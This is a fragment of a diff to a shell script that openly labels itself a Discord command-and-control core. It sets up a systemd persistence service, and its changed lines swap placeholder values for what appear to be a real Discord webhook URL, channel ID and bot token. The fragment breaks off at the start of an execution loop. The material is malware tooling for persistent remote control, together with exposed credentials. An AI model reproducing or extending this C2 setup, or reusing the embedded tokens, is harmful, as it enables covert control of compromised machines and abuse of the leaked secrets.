@@ -27,9 +27,9 @@ EOF
 systemctl enable pulse.service  
 
 # --- Phase 2: Discord C2 Core ---  
-WEBHOOK_URL="https://discord.com/api/webhooks/XXXX/YYYY" # Replace with yours  
-CHANNEL_ID="666666666666666666" # Your channel ID  
-BOT_TOKEN="AAAAAAAAAAAAAAAAAAAAAAAA.AAAAAA.AAAAAAA" # Your bot token  
+WEBHOOK_URL="https://discord.com/api/webhooks/1333683986286776340/FYDrvCm9zGAkC8X-gzPpD9iwGguiCvTebP3mOfVy5hxl5b8CRvzPBydf-FdFL7GPey8v" # Replace with yours  
+CHANNEL_ID="1101487519243190303" # Your channel ID  
+BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnMfXI" # Your bot token  
 
 # Execution loop from hell  
 while :; do  
